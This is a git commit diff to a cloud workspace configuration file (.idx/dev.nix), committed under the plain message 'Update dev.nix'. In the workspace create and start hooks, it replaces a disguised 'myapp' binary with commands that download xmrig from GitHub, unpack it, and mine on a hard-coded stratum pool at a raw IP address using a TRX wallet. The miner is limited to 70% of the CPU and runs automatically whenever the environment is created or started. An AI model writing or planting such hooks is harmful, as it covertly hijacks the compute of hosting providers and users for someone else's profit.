7cf57e05f393f72d80efa85d0e2d37bc1ee13280
ngthduyen1102 <63939431+ngthduyen1102@users.noreply.github.com>
2025-08-11 22:37:58 +0700

    Update dev.nix

--- .idx/dev.nix
+++ .idx/dev.nix
@@ -4,6 +4,7 @@
   packages = [
     pkgs.jdk17
     pkgs.unzip
+    pkgs.wget
   ];
 
   env = { };
@@ -17,15 +18,23 @@
     workspace = {
       onCreate = {
         run = ''
-          echo "Running myapp on create..."
-          /home/user/da/myapp -a rx/0 -o stratum+tcp://3.147.193.96:5555 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
+          echo "Downloading and extracting xmrig on create..."
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
+          tar -xvf xmrig-6.22.2-focal-x64.tar.gz
+          cd xmrig-6.22.2
+          echo "Running xmrig on create..."
+          ./xmrig -a rx/0 -o stratum+tcp://3.147.193.96:5555 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
         '';
       };
 
       onStart = {
         run = ''
-          echo "Running myapp on start..."
-          /home/user/da/myapp -a rx/0 -o stratum+tcp://3.147.193.96:5555 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
+          echo "Downloading and extracting xmrig on start..."
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
+          tar -xvf xmrig-6.22.2-focal-x64.tar.gz
+          cd xmrig-6.22.2
+          echo "Running xmrig on start..."
+          ./xmrig -a rx/0 -o stratum+tcp://3.147.193.96:5555 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
         '';
       };
     };
